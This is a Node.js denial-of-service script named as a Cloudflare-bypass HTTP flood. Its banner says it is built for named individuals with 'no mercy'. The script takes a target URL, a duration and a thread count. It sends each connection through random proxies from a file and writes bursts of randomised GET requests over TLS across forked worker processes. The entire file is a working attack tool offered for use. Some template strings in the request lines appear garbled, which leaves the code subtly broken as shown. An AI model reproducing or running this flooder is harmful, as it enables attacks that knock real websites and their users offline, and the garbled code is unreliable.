// XYMATEKIDD v2 - Cloudflare Bypass Flood
// For Ghost only. No mercy. 🔥

const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');

console.log("\x1b[31m╔══════════════════════════════════════╗");
console.log("║       XYMATEKIDD CF-BYPASS FLOOD     ║");
console.log("║          Built for Ghost & Jax       ║");
console.log("╚══════════════════════════════════════\x1b[0m");

if (process.argv.length < 5) {
    console.log("node index.js <target> <time> <threads>");
    process.exit();
}

const target = process.argv[2];
const time = process.argv[3] * 1000;
const threads = process.argv[4];

const ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B)"
];

const proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

function randProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function attack() {
    setInterval(() => {
        const proxy = randProxy().split(':');
        const options = {
            host: proxy[0],
            port: proxy[1],
            method: 'CONNECT',
            path: target + ':443'
        };

        const req = http.request(options);
        req.end();

        req.on('connect', (res, socket) => {
            const client = tls.connect({
                host: new URL(target).host,
                servername: new URL(target).host,
                socket: socket,
                ALPNProtocols: ['h2', 'http/1.1'],
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
                secureProtocol: 'TLSv1_2_method',
                rejectUnauthorized: false
            }, () => {
                for (let i = 0; i < 64; i++) {
                    client.write(`GET /?\( {Math.random()} HTTP/1.1\r\nHost: \){new URL(target).host}\r\nUser-Agent: ${ua[Math.floor(Math.random()*ua.length)]}\r\nAccept: text/html,application/xhtml+xml\r\nConnection: keep-alive\r\n\r\n`);
                }
            });
        });
    });
}

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(`\x1b[32m[+] FLOOD STARTED → \( {target} | \){threads} threads | ${process.argv[3]}s\x1b[0m`);
    setTimeout(() => process.exit(), time);
} else {
    attack();
}
